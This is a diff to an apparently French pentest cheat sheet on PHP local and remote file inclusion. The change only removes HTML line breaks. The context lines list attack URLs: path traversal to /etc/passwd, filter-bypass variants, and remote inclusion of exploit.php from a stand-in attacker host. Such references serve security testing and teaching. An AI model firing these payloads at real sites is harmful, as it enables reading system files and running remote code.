@@ -189,20 +189,16 @@ Fonctions PHP vulnérables : require, require_once, include, include_once.
 **LFI classique**
 * http://test.fr/index.php?page=../../../etc/passwd
 
-<br/>
-
 **RFI classique**
 * http://test.fr/index.php?page=http://atacker.com/exploit.php
 * http://test.fr/index.php?page=\\attacker.com\shared\exploit.php
 
-<br/>
 
 **LFI bypass**
 * http://test.fr/index.php?page=....//....//....//etc/passwd
 * http://test.fr/index.php?page=....\/....\/....\/etc/passwd
 * http://test.fr/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
 
-<br/>
 
 **Les 25 paramètres les plus vulnérables à une LFI** 
 <br/>
